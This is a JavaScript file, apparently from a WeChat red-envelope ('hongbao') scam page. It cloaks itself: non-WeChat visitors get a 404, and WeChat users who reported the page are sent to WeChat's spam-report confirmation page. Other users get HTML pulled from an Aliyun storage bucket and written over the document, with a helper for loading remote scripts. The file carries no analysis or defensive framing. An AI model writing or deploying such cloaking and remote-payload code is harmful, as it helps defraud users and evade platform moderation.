function _GET(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)","i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null)
        return unescape(r[2]);
    return null;
}

function View(a) {
    function d() {
        var a = document.open("text/html", "replace");
        a.write(c), a.close();
    }
    var b, c;
    a = a + "?_=" + Date.now(), b = new XMLHttpRequest(), c = null, b.onload = function() {
        c = b.responseText;
        var a = 0;
        a > 0 ? setTimeout("render()", 1e3 * a) :d();
    }, b.open("GET", a, !0), b.send();
}

function loadJs(a, b) {
    var c = document.createElement('script');
    'undefined' != typeof b && (c.readyState ? c.onreadystatechange = function() {
        ('loaded' == c.readyState || 'complete' == c.readyState) && (c.onreadystatechange = null,
            b());}: c.onload = function() {b();}),c.src = a,
        document.body.appendChild(c);
}
var Cook = {
    set:function(a, b) {
        var c = 30, d = new Date();
        d.setTime(d.getTime() + 1e3 * 60 * 60 * 24 * c), document.cookie = a + "=" + escape(b) + ";expires=" + d.toGMTString();
    },
    get:function(a) {
        var b, c = new RegExp("(^| )" + a + "=([^;]*)(;|$)");
        return (b = document.cookie.match(c)) ? unescape(b[2]) :null;
    }
};

var ua = navigator.userAgent.toLowerCase();
if (/micromessenger/.test(ua)) {
    if(Cook.get('report') == '1'){
        var url = 'https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=20&source=2&wx_header=0';
        location.href = url;
    }else{
        View('https://xx3-88.oss-cn-shanghai.aliyuncs.com/xx2-66/hongbao/home/index.html');
    }
}else{
    location.href = '/404';
}
